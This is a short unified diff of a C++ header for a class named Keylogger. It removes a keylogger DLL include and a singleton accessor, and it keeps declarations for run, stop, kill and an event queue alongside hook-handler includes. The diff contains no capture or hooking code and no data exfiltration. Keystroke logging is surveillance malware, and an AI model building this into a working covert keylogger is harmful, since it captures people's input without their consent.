@@ -9,12 +9,8 @@
 #include "AEvent.h"
 #include "EventManager.h"
 #include "HookHandler.h"
-#include "KeyloggerDLL.h"
 
 class Keylogger {
-public: 
-	static Keylogger _instance;
-
 public:
     Keylogger();
 	~Keylogger();
@@ -22,7 +18,6 @@ public:
     void				run();
     bool				stop();
     bool				kill();
-    Keylogger& getInstance();
     bool pushToQueue(AEvent*);
 
 private: 
